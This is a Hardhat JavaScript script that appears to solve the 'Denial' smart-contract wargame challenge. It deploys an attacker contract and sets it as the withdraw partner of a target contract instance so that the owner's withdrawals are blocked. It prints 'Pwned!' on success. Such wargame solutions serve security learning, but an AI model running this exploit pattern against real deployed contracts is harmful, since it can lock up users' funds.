const { ethers } = require("hardhat")
require("dotenv").config()

const denialInstanceAddress = "0xC2Fa4C4382E99b60D41B9289554AaC98c9A15640"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Get Denial contract */

  console.log("Connecting to your instance of Denial contract...")
  const denial = await ethers.getContractAt("Denial", denialInstanceAddress, deployer)

  console.log("Deploying attacker contract...")
  await deployments.fixture("denial")
  const attacker = await ethers.getContract("DenialAttacker", deployer)

  /* Running the attack */

  console.log("Calling setWithdrawPartner with attacker contract as parameter...")
  const setWithdrawPartner = await denial.setWithdrawPartner(attacker.address)
  await setWithdrawPartner.wait(1)

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
